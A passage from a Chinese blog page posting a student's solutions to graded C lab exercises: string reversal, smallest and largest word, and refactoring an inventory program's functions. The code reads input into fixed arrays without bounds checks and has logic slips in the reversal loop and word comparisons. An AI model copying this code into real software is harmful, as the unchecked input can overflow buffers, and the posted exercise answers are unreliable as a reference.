class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch, arr[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        arr[i] = ch;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &gt; <span class="hljs-number">-1</span>; j--)<br>    &#123;<br>        <span class="hljs-built_in">putchar</span>(arr[j]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大最小单词简略版（The-Biggest-and-Smallest-Words）"><a href="#最大最小单词简略版（The-Biggest-and-Smallest-Words）" class="headerlink" title="最大最小单词简略版（The Biggest and Smallest Words）"></a>最大最小单词简略版（The Biggest and Smallest Words）</h3><blockquote><p>编写程序找出一组单词中“最小”单词和“最大”单词。</p><p>用户输入单词后，程序根据字典顺序决定排在最前面和最后面的单词。</p><p>当用户输入4个字母的单词时，程序停止读入。假设所有单词都不超过20个字母。</p><p><em><strong>输出范例1</strong>：</em></p><blockquote><p>Enter word: dog<br>Enter word: zebra<br>Enter word: rabbit<br>Enter word: catfish<br>Enter word: walrus<br>Enter word: cat<br>Enter word: fish</p><p>Smallest word: cat<br>Largest word zebra</p></blockquote><p><em><strong>输出范例2：</strong></em></p><blockquote><p>Enter word: computer<br>Enter word: ink<br>Enter word: light<br>Enter word: bookrack<br>Enter word: book</p><p>Smallest word: book<br>Largest word: light</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">isMin</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (chNew[i] &lt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">isMax</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (chNew[i] &gt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getSmallest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (isMin(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getBiggest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (isMax(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> words[<span class="hljs-number">30</span>][<span class="hljs-number">30</span>];<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>, counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len != <span class="hljs-number">4</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, words[counts++]);<br>        len = <span class="hljs-built_in">strlen</span>(words[counts - <span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// words[counts++] = ch;</span><br>        <span class="hljs-comment">//  foundSmallest(len);</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smallest word: %s\n&quot;</span>, getSmallest(words, counts));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Largest word: %s&quot;</span>, getBiggest(words, counts));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h2><h3 id="01-main函数改造。"><a href="#01-main函数改造。" class="headerlink" title="01 main函数改造。"></a>01 main函数改造。</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>main</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> <span class="hljs-title">inventory</span>[<span class="hljs-title">MAX_PARTS</span>];</span><br>    <span class="hljs-type">int</span> number_parts = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> code;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter operation code:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            ;<br>        <span class="hljs-keyword">switch</span> (code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>            insert(inventory, &amp;number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            search(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>            update(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:<br>            print(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Illegal code\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="02-insert-函数改造"><a href="#02-insert-函数改造" class="headerlink" title="02 insert 函数改造"></a>02 insert 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>insert</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> </span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span>* np)</span><br>&#123;<br>    <span class="hljs-type">int</span> part_number;<br>    <span class="hljs-keyword">if</span> (*np == MAX_PARTS) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Database is full; cannot add more parts.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;part_number);<br>    <span class="hljs-keyword">if</span> (find_part(part_number, inv, *np) &gt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part already exits.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    inv[*np].number = part_number;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part name:&quot;</span>);<br>    read_line(inv[*np].name, NAME_LEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter quantity on hand:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;inv[*np].on_hand);<br>    (*np)++;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="03-search-函数改造"><a href="#03-search-函数改造" class="headerlink" title="03 search 函数改造"></a>03 search 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>search</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 完成人　：黄晓诚(2023090910023)</span><br><span class="hljs-comment"> * 完成时间：2023-11-07, Tue, 21:36:47</span><br><span class="hljs-comment"> * 系统评分：100</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part name: %s\n&quot;</span>, inv[i].name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Quantity on hand: %d\n&quot;</span>, inv[i].on_hand);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="04-update-函数改造"><a href="#04-update-函数改造" class="headerlink" title="04 update 函数改造"></a>04 update 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>update</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number, change;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter change in quantity on hand: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;change);<br>    inv[i].on_hand += change;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="05-print-函数改造"><a href="#05-print-函数改造" class="headerlink" title="05 print 函数改造"></a>05 print 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 print 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span 